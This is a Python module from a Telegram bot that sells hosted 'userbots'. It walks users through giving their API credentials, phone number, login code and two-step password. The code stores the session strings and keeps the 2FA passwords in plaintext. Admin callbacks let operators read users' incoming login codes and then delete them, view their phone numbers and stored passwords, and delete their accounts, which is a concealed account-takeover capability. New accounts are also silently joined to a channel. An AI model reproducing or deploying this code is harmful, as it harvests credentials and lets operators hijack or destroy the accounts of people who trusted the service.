import asyncio
import importlib
from datetime import datetime

from dateutil.relativedelta import relativedelta
from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *

from ubot import *


async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if len(ubot._ubot) > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("Tutup", callback_data="0_cls")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            f"""
<b>❌ Not Creating Userbot !</b>

<b>📚 Because It Has Reached What Has Been Determined : {len(ubot._ubot)}</b>

<b>👮‍♂ please contact admins . </b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("➡️ Continue", callback_data="bayar_dulu")],
            [InlineKeyboardButton("❌ Cancel", callback_data=f"home {user_id}")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        await bikin_ubot(client, callback_query)


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    await callback_query.message.delete()
    return await bot.send_message(
        user_id,
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def bikin_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    try:
        await callback_query.message.delete()
        api_id_msg = await bot.ask(
            user_id,
            (
                "<b>Please enter your API ID.</b>\n"
                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Time Has Run Out")
    if await is_cancel(callback_query, api_id_msg.text):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        return await bot.send_message(user_id, "API ID Must be a number.")
    await callback_query.message.delete()
    api_hash_msg = await bot.ask(
        user_id,
        (
            "<b>Please enter your API HASH.</b>\n"
            "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
        ),
        timeout=300,
    )
    if await is_cancel(callback_query, api_hash_msg.text):
        return
    api_hash = api_hash_msg.text
    try:
        await callback_query.message.delete()
        phone = await bot.ask(
            user_id,
            (
                "<b>Please enter your Telegram phone number with the country code format.\nExample: +628xxxxxxx</b>\n"
                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=api_id,
        api_hash=api_hash,
        in_memory=True,
    )
    get_otp = await bot.send_message(user_id, "<b>Sending OTP ...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>Akun Telegram</a> ʀᴇsᴍɪ",
            SentCodeType.SMS: "Sms Anda",
            SentCodeType.CALL: "Panggilan Telepon",
            SentCodeType.FLASH_CALL: "Panggilan Kilat Telepon",
            SentCodeType.FRAGMENT_SMS: "Fragment Sms",
            SentCodeType.EMAIL_CODE: "Email Sms",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                "<b>Please Check OTP Code from <a href=tg://openmessage?user_id=777000>Official Telegram Account</a>. Send OTP Code here after reading the Format below.</b>\n"
                "\n If OTP Code is <code> 12345 </code> Please <b>[ ADD SPACE ]</b> send it Like this <code>1 2 3 4 5</code> \n"
                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>Your account has enabled Two-Step Verification. Please send the password.\n\nUse /cancel to cancel the process of creating a userbot</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "Batas waktu tercapai 5 menit.")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "Tunggu proses selama 1-5 menit..",
        disable_web_page_preview=True,
    )
    await new_client.start()
    await asyncio.sleep(1)
    await create_botlog(new_client)
    mmk = await get_log(new_client)
    await asyncio.sleep(1)
    ngentot = await new_client.export_chat_invite_link(int(mmk.id))
    await set_log_group(new_client.me.id, logger=True)
    await asyncio.sleep(1)
    expired = None
    if new_client.me.id in await get_seles():
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=12)
        await set_expired_date(new_client.me.id, expired)
    else:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=1)
        await set_expired_date(new_client.me.id, expired)
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
    )
    if callback_query.from_user.id not in await get_seles():
        try:
            await remove_prem(callback_query.from_user.id)
        except:
            pass
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} Successfully Activated On Account :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nIni is your Log Group : {ngentot} .</b>"
    await bot_msg.edit(text_done)
    try:
        await new_client.join_chat("kynansupport")
    except UserAlreadyParticipant:
        pass
    return await bot.send_message(
        LOG_UBOT,
        f"""
<b>❏ Userbot Activated</b>
<b> ├ Account :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ID :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Cek Kadaluarsa",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )


async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.userbot(ubot._ubot[count].me.id, count)
        ),
    )


async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if user_id not in USER_ID:
        return await callback_query.answer(
            f"❌ Don't Click, Sir. {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Code not found", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            Button.userbot(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 phone number <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 2-step verification code not found", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 2-step verification code not found <code>{X.me.id}</code> is : <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            f"""
<b>❏ Penting !! </b>
<b>├ Account :</b> <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
<b>├ ID :</b> <code>{X.me.id}</code>
<b>╰ Account successful deleted </b>
""",
            reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[1]))),
        )


async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
    )


async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ Stay {xxxx} another day", True)
    except:
        return await callback_query.answer("✅ No longer active", True)


async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in USER_ID:
        return await callback_query.answer(
            f"❌ Don't Click Boss{callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await bot.send_message(
                OWNER_ID, f"<b> ✅ {get_mention} Successfully Removed From Database</b>"
            )
            return await bot.send_message(X.me.id, "<b>💬 Your Active Time Has Expired")


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<b>Proses Di Batalkan !</b>"
        )
        return True
    return False
